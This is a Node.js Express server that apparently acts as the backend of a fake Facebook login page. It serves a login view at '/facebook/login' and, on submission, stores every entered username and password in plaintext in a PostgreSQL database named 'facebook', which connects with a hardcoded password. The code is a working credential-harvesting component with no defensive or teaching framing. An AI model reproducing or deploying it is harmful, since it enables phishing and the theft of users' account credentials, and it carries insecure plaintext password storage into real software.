const express = require("express");
const path = require("path");
const Pool = require("pg").Pool;

const app = express();

const pool = new Pool({
    user: "postgres",
    host: "localhost",
    database: "facebook",
    password: "1234",
    port: "5432",
});

pool
  .connect()
  .then(() => console.log("Connected to facebook database"))
  .catch((err) => console.error("Error connecting to facebook database:", err));

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.use(express.static(path.join(__dirname, "public")));

// Middleware to parse JSON bodies
app.use(express.json());
// Middleware to parse URL-encoded bodies (for form data)
app.use(express.urlencoded({ extended: true }));

app.get("/facebook/login", (req, res) => {
    res.render("index");
});

app.post("/facebook/login", async (req, res) => {
    try {
        const { username, password } = req.body;
        await pool.query(
            "INSERT INTO users (username, password) VALUES ($1, $2)",
            [username, password]
        );
        res.status(201).send("User added successfully");
    } catch (error) {
        console.error("Error inserting user:", error);
        res.status(500).send("Error inserting user");
    }
});

app.listen(8080, () => {
    console.log("Server listening on port 8080");
});

